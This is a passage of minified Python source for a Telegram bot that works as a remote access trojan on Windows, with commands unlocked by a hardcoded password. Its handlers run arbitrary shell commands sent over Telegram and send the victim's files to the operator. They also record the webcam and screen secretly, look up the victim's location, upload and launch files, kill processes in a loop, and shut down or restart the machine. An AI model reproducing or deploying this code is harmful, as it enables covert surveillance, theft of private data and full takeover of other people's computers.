	try:B=os.stat(E);F=time.ctime(B[stat.ST_MTIME]);C=B[stat.ST_SIZE]/1048576;C=round(C,2);G=time.ctime(B[stat.ST_ATIME]);D=f"Last modified: {F}\n";D+=f"Size in MB: {C} MB\n";D+=f"Last accessed: {G}\n";bot.send_message(A.chat.id,D)
	except Exception as H:bot.send_message(A.chat.id,f"Error: {str(H)}")
@bot.message_handler(commands=['minimize'])
def minimize(message):
	A=message
	try:pyautogui.hotkey(_N,_L);bot.send_message(A.chat.id,'The active window has been minimized!');bot.send_message(A.chat.id,'Type the command again to minimize the window to the taskbar.')
	except Exception as B:bot.send_message(A.chat.id,f"Error: {B}")
@bot.message_handler(commands=['maximize'])
def maximize(message):
	A=message
	try:pyautogui.hotkey(_N,_M);bot.send_message(A.chat.id,'The active window has been maximized!')
	except Exception as B:bot.send_message(A.chat.id,f"Error: {B}")
@bot.message_handler(commands=['cmdbomb'])
def cmdbomb(message):
	A=message
	try:os.popen('start cmd && start cmd && start cmd && start cmd && start cmd && start cmd && start cmd && start cmd && start cmd && start cmd');bot.send_message(A.chat.id,'Opened 10 CMD windows!')
	except Exception as B:bot.send_message(A.chat.id,f"Error: {B}")
waiting_for_upload=_C
@bot.message_handler(commands=['upload'])
def handle_upload_command(message):global waiting_for_upload;waiting_for_upload=_A;bot.send_message(message.chat.id,'Please send your file:')
@bot.message_handler(content_types=['document','photo','audio','video','voice'])
def handle_file(message):
	A=message;global waiting_for_upload
	if waiting_for_upload:
		try:
			B=A.document.file_name if A.document else A.photo.file_name;C=bot.get_file(A.document.file_id)if A.document else bot.get_file(A.photo[-1].file_id);D=bot.download_file(C.file_path)
			with open(B,'wb')as E:E.write(D)
			F=os.getcwd();bot.send_message(A.chat.id,f"File has been sent successfully in: {F}");waiting_for_upload=_C
		except Exception as G:bot.send_message(A.chat.id,f"Error: {G}")
	else:bot.send_message(A.chat.id,'Please enter the /upload command first')
@bot.message_handler(commands=['altf4'])
def altf(message):
	A=message
	try:pyautogui.hotkey(_K,_U);bot.send_message(A.chat.id,'ALT + F4 was pressed successfully')
	except Exception as B:bot.send_message(A.chat.id,f"Error: {B}")
@bot.message_handler(commands=['run'])
def startfile(message):
	A=message
	try:B=A.text.split('/run',1)[1].strip();os.popen(f"start {str(B)}");bot.send_message(A.chat.id,'File opened successfully!')
	except Exception as C:bot.send_message(A.chat.id,f"Error:{C}")
@bot.message_handler(commands=['changeclipboard'])
def chgclip(message):
	A=message
	try:B=A.text.split('/changeclipboard',1)[1].strip();C='echo | set /p nul='+B.strip()+'| clip';os.system(C);bot.send_message(A.chat.id,f'Clipboard was changed to "{B}" successfully!')
	except Exception as D:bot.send_message(A.chat.id,f"Error: {D}")
@bot.message_handler(commands=['wallpaper'])
def wallpaper(message):A=message;bot.send_message(A.chat.id,'First run /upload and upload picture');bot.send_message(A.chat.id,"Then send name of photo to change desktop's wallpaper:");bot.register_next_step_handler(A,wall)
def wall(message):
	A=message;B=A.text
	if not B.startswith('/'):
		try:ctypes.windll.user32.SystemParametersInfoW(20,0,os.path.abspath(str(B)),0);bot.send_message(A.chat.id,"Desktop's wallpaper successfully changed!")
		except Exception as C:bot.send_message(A.chat.id,f"Error{C}")
@bot.message_handler(commands=['download'])
def download_file(message):
	A=message;B=A.text.split('/download',1)[1].strip()
	try:
		with open(B,_B)as C:
			if str(B[-3:])=='png':bot.send_photo(A.chat.id,C)
			elif str(B[-3:])=='jpg':bot.send_photo(A.chat.id,C)
			elif str(B[-3:])=='svg':bot.send_photo(A.chat.id,C)
			elif str(B[-3:])=='jpeg':bot.send_photo(A.chat.id,C)
			elif str(B[-3:])=='mkv':bot.send_video(A.chat.id,C,timeout=100)
			else:bot.send_document(A.chat.id,C)
	except Exception as D:bot.send_message(A.chat.id,f"Error{D}")
@bot.message_handler(commands=['fullvolume'])
def volp(message):
	A=message
	try:
		B=0
		while B<70:pyautogui.press(_D);B+=1
		bot.send_message(A.chat.id,'successfully full!')
	except Exception as C:bot.send_message(A.chat.id,f"Error{C}")
@bot.message_handler(commands=['volumeplus'])
def volp(message):
	A=message
	try:pyautogui.press(_D);pyautogui.press(_D);pyautogui.press(_D);pyautogui.press(_D);pyautogui.press(_D);bot.send_message(A.chat.id,'successfully +10')
	except Exception as B:bot.send_message(A.chat.id,f"Error{B}")
@bot.message_handler(commands=['volumeminus'])
def volm(message):
	A=message
	try:pyautogui.press(_F);pyautogui.press(_F);pyautogui.press(_F);pyautogui.press(_F);pyautogui.press(_F);bot.send_message(A.chat.id,'successfully -10')
	except Exception as B:bot.send_message(A.chat.id,f"Error{B}")
@bot.message_handler(commands=['webcam'])
def camsw(message):A=message;bot.send_message(A.chat.id,'Switch the camera (0 is default camera)');B=bot.send_message(A.chat.id,'Enter 0, 1, or another index:');bot.register_next_step_handler(B,lambda msg:camv(msg,int(msg.text)))
def camv(message,camera_index):A=bot.send_message(message.chat.id,_Aq);bot.register_next_step_handler(A,lambda msg:camer(msg,camera_index,int(msg.text)))
def camer(message,camera_index,record_time):
	A=message;bot.send_message(A.chat.id,_Ag);B=cv2.VideoCapture(camera_index);E=cv2.VideoWriter_fourcc(*'XVID');C=_P;D=cv2.VideoWriter(C,E,2e1,(640,480));F=time.time()
	while _A:
		G,H=B.read()
		if G:
			D.write(H)
			if time.time()-F>record_time:break
		else:break
	B.release();D.release();cv2.destroyAllWindows()
	try:
		with open(C,_B)as I:bot.send_document(A.chat.id,I,timeout=122)
	except Exception as J:bot.send_message(A.chat.id,f"Error: {J}")
	os.remove(_P)
@bot.message_handler(commands=[_V])
def help(message):
	A=message
	if n==_C:bot.send_message(A.chat.id,_Aj);bot.register_next_step_handler(A,checkpasswd)
	else:bot.send_message(A.chat.id,textovik)
def checkpasswd(message):
	A=message
	if A.text=='MomentoMori':global n;n=_A;bot.send_message(A.chat.id,_Ak);bot.send_message(A.chat.id,textovik)
	else:bot.send_message(A.chat.id,_Al)
@bot.message_handler(commands=['examples'])
def examples(message):bot.send_message(message.chat.id,examplestext)
@bot.message_handler(commands=['textspech'])
def screen(message):
	A=message
	try:B=A.text.split('/textspech',1)[1].strip();C=pyttsx3.init();C.say(B);C.runAndWait();bot.send_message(A.chat.id,f"{B}  sended successfully!")
	except Exception as D:bot.send_message(A.chat.id,f"Error: {D}")
@bot.message_handler(commands=['screenrecord'])
def screen(message):A=bot.send_message(message.chat.id,_Aq);bot.register_next_step_handler(A,scr)
def scr(message):
	A=message;bot.send_message(A.chat.id,_Ag);D,E=pyautogui.size();F=cv2.VideoWriter_fourcc(*'XVID');C=cv2.VideoWriter(_P,F,1e1,(D,E));G=time.time()
	while _A:
		H=pyautogui.screenshot();B=np.array(H);B=cv2.cvtColor(B,cv2.COLOR_RGB2BGR);C.write(B)
		if time.time()-G>int(A.text):break
	C.release();cv2.destroyAllWindows()
	try:
		with open(_P,_B)as I:bot.send_document(A.chat.id,I,timeout=122)
	except Exception as J:bot.send_message(A.chat.id,f"Error:{J}")
	os.remove(_P)
@bot.message_handler(commands=['info'])
def information(message):
	B=message
	try:A=os.popen('curl ipinfo.io/ip').read().strip();bot.send_message(B.chat.id,f"Ip:\n {A}");A=os.popen('curl ipinfo.io/city').read().strip();bot.send_message(B.chat.id,f"City:\n {A}");A=os.popen('curl ipinfo.io/region').read().strip();bot.send_message(B.chat.id,f"Region:\n {A}");A=os.popen('curl ipinfo.io/country').read().strip();bot.send_message(B.chat.id,f"Country:\n {A}");A=os.popen('curl ipinfo.io/loc').read().strip();bot.send_message(B.chat.id,f"Location:\n {A}");A=os.popen('curl ipinfo.io/org').read().strip();bot.send_message(B.chat.id,f"Provider:\n {A}");A=os.popen('curl ipinfo.io/postal').read().strip();bot.send_message(B.chat.id,f"Postal:\n {A}");A=os.popen('curl ipinfo.io/timezone').read().strip();bot.send_message(B.chat.id,f"Timezone:\n {A}")
	except Exception as C:bot.send_message(B.chat.id,f"Error:{C}")
@bot.message_handler(commands=['winblocker'])
def winblocker(message):
	B=message;bot.send_message(B.chat.id,_Ar)
	while _A:
		C=os.popen(_As).read().strip();D=[_At,_Au,_Av,_Z,_Aw,_Ax,_Ay,_Az,_A_,_B0,_B1,_B2,_B3,_B4,_B5,_B6,_B7,_B8,_B9,_BA,_BB,_BC,_BD,_BE,_BF,_BG,_BH,_BI,_BJ,_BK]
		for A in D:
			if A in C:
				if A==_Z:0
				else:bot.send_message(B.chat.id,f"{A} is killed!")
				os.popen(f"taskkill /f /im {A}")
@bot.message_handler(commands=['winblocker2'])
def winblocker(message):
	B=message;bot.send_message(B.chat.id,_Ar)
	while _A:
		C=os.popen(_Ah).read().strip();D=[_At,_Au,_Av,_Z,_Aw,_Ax,_Ay,_Az,_A_,_B0,_B1,_B2,_B3,_B4,_B5,_B6,_B7,_B8,_B9,_BA,_BB,_BC,_BD,_BE,_BF,_BG,_BH,_BI,_BJ,_BK]
		for A in D:
			if A in C:
				if A==_Z:0
				else:bot.send_message(B.chat.id,f"{A} is killed!")
				os.popen(f"taskkill /f /im {A}")
@bot.message_handler(commands=['playsound'])
def plsound(message):
	A=message
	try:B=A.text.split('/playsound',1)[1].strip();os.popen(f"start {B}");bot.send_message(A.chat.id,'Music started playing in pc successfully')
	except Exception as C:bot.send_message(A.chat.id,f"Error:{C}")
@bot.message_handler(commands=['chrome'])
def opensite(message):
	A=message
	try:B=A.text.split('/chrome',1)[1].strip();os.popen(f'start chrome "{B}"');bot.send_message(A.chat.id,f"Site:{B} has opened successfully")
	except Exception as C:bot.send_message(A.chat.id,f"Error:{C}")
@bot.message_handler(commands=['edge'])
def opensite(message):
	A=message
	try:B=A.text.split('/edge',1)[1].strip();os.popen(f'start msedge "{B}"');bot.send_message(A.chat.id,f"Site:{B} has opened successfully")
	except Exception as C:bot.send_message(A.chat.id,f"Error:{C}")
@bot.message_handler(commands=['firefox'])
def opensite(message):
	A=message
	try:B=A.text.split('/firefox',1)[1].strip();os.popen(f'start firefox "{B}"');bot.send_message(A.chat.id,f"Site:{B} has opened successfully")
	except Exception as C:bot.send_message(A.chat.id,f"Error:{C}")
@bot.message_handler(commands=['webscreen'])
def take_photo(message):
	B=message
	try:
		C=cv2.VideoCapture(0);G,D=C.read();A='photo.jpg';cv2.imwrite(A,D)
		with open(A,_B)as E:bot.send_photo(B.chat.id,E)
		os.remove(A);C.release()
	except Exception as F:bot.send_message(B.chat.id,f"Error capturing photo: {F}")
@bot.message_handler(commands=['screenshot'])
def take_screenshot(message):
	B=message
	try:
		A='screenshot.png';pyautogui.screenshot(A)
		with open(A,_B)as C:bot.send_photo(B.chat.id,C)
		os.remove(A)
	except Exception as D:bot.send_message(B.chat.id,f"Error :(: {D}")
current_directory=os.getcwd()
@bot.message_handler(commands=[_Y])
def slip(message):
	A=message
	try:ctypes.windll.PowrProf.SetSuspendState(0,1,0);bot.send_message(A.chat.id,'Pc is sendend to sleep mode!')
	except Exception as B:bot.send_message(A.chat.id,f"Error :(: {B}")
@bot.message_handler(commands=['cd'])
def change_directory_command(message):
	A=message
	try:global current_directory;B=A.text.split('/cd',1)[1].strip();os.chdir(B);current_directory=os.getcwd();bot.send_message(A.chat.id,f"You are in this directory:\n{current_directory}")
	except Exception as C:bot.send_message(A.chat.id,f"This directory does not exists: {C}")
@bot.message_handler(commands=[_Q])
def whoami_command(message):A=os.popen(_Q).read().strip();bot.send_message(message.chat.id,f"result: {A}")
execute_enabled=_C
def execute_command(command):
	A=command;global execute_enabled
	try:
		if A.lower()=='exit':execute_enabled=_C;return'Exit'
		elif A.lower()=='cd..':D=os.getcwd();B=os.path.abspath(os.path.join(D,os.pardir));os.chdir(B);return f"You are in: {B}"
		elif A.lower().startswith('cd '):C=A.lower().split(' ',1)[1].strip();os.chdir(C);return f"You are in: {C}"
		else:E=os.popen(A.lower()).read();return f"Result:\n\n{E}"
	except Exception as F:return f"Error:\n\n{F}"
@bot.message_handler(commands=[_T])
def handle_execute(message):global execute_enabled;execute_enabled=_A;bot.send_message(message.chat.id,'Enter  your command(enter "exit", if you want to exit):')
@bot.message_handler(func=lambda message:execute_enabled)
def handle_command(message):A=message;B=execute_command(A.text);bot.send_message(A.chat.id,B)
'@bot.message_handler(commands=[\'execute\'])\ndef handle_execute(message):\n    bot.send_message(message.chat.id, "enter command for execution (enter \'exit\' if you want to exit):")\n\n@bot.message_handler(func=lambda message: True)\ndef handle_command(message):\n    try:\n        if message.text.lower() == \'exit\':\n            bot.send_message(message.chat.id, "Exit")\n            \n        elif message.text.lower() == \'cd..\':\n                current_directory = os.getcwd()\n                parent_directory = os.path.abspath(os.path.join(current_directory, os.pardir))\n                os.chdir(parent_directory)\n                bot.send_message(message.chat.id, f"You are in: {parent_directory}")\n        elif message.text.lower().startswith(\'cd \'):\n                directory = message.text.lower().split(\' \', 1)[1].strip()\n                os.chdir(directory)\n                bot.send_message(message.chat.id, f"You are in: {directory}")\n        else:\n                res = os.popen(message.text.lower()).read()\n                bot.send_message(message.chat.id, f"Result:\n\n{res}")\n    except Exception as e:\n        bot.send_message(message.chat.id, f"Error:\n\n{e}")\n    '
@bot.message_handler(commands=['shellexecute'])
def command_execution(message):A=message;B=A.text.split('/shellexecute',1)[1].strip();C=os.popen(B).read();bot.send_message(A.chat.id,f"Result of command:\n\n{C}")
@bot.message_handler(commands=['e'])
def command_execution(message):
	A=message
	try:
		B=A.text.split('/e',1)[1].strip()
		if B=='cd..':E=os.getcwd();C=os.path.abspath(os.path.join(E,os.pardir));os.chdir(C);bot.send_message(A.chat.id,f"You are in: {C}")
		elif B.startswith('cd '):D=B.split(' ',1)[1].strip();os.chdir(D);bot.send_message(A.chat.id,f"You are in: {D}")
		else:F=os.popen(B).read();bot.send_message(A.chat.id,f"Result:\n\n{F}")
	except Exception as G:bot.send_message(A.chat.id,f"Error:\n\n{G}")
MAX_MESSAGE_LENGTH=4096
@bot.message_handler(commands=['ex'])
def command_execution(message):
	A=message
	try:
		B=A.text.split('/ex',1)[1].strip()
		if B=='cd..':F=os.getcwd();D=os.path.abspath(os.path.join(F,os.pardir));os.chdir(D);bot.send_message(A.chat.id,f"You are in: {D}")
		elif B.startswith('cd '):G=B.split(' ',1)[1].strip();os.chdir(G);bot.send_message(A.chat.id,f"You are in: {os.getcwd()}")
		else:
			C=os.popen(B).read();E=[C[A:A+MAX_MESSAGE_LENGTH]for A in range(0,len(C),MAX_MESSAGE_LENGTH)]
			if len(E)>1:
				with open(_I,_E,encoding=_H)as H:H.write(C);os.popen(_Ai)
				with open(_I,_B)as I:bot.send_document(A.chat.id,I)
				os.remove(_I)
			else:
				for J in E:bot.send_message(A.chat.id,f"Result:\n\n{J}")
	except Exception as K:bot.send_message(A.chat.id,f"Error:\n\n{K}")
@bot.message_handler(commands=['shutdown'])
def command_execution(message):
	A=message
	try:os.popen('shutdown /s /f /t 0');bot.send_message(A.chat.id,'pc is shutdowned!')
	except Exception as B:bot.send_message(A.chat.id,f"Error:{B}")
@bot.message_handler(commands=['restart'])
def command_execution(message):
	A=message
	try:os.popen('shutdown /r /f /t 0');bot.send_message(A.chat.id,'pc is restarted!')
	except Exception as B:bot.send_message(A.chat.id,f"Error:{B}")
@bot.message_handler(commands=[_Ah])
def command_execution(message):
	F='_windows2_.txt';B=message
	try:
		G=_Ah;A=os.popen(G).read();C=[A[B:B+MAX_MESSAGE_LENGTH]for B in range(0,len(A),MAX_MESSAGE_LENGTH)]
		if len(C)>1:
			with open(_I,_E,encoding=_H)as D:D.write(A);os.popen(_Ai)
			with open(_I,_B)as E:bot.send_document(B.chat.id,E)
			os.remove(_I)
		A=os.popen(_As).read().strip();C=[A[B:B+MAX_MESSAGE_LENGTH]for B in range(0,len(A),MAX_MESSAGE_LENGTH)]
		if len(C)>1:
			with open(F,_E,encoding=_H)as D:D.write(A);os.popen(_Ai)
			with open(F,_B)as E:bot.send_document(B.chat.id,E)
			os.remove(F)
		else:
			for H in C:bot.send_message(B.chat.id,f"Result:\n\n{H}")
	except Exception as I:bot.send_message(B.chat.id,f"Error:\n\n{I}")
if __name__=='__main__':bot.polling(none_stop=_A)
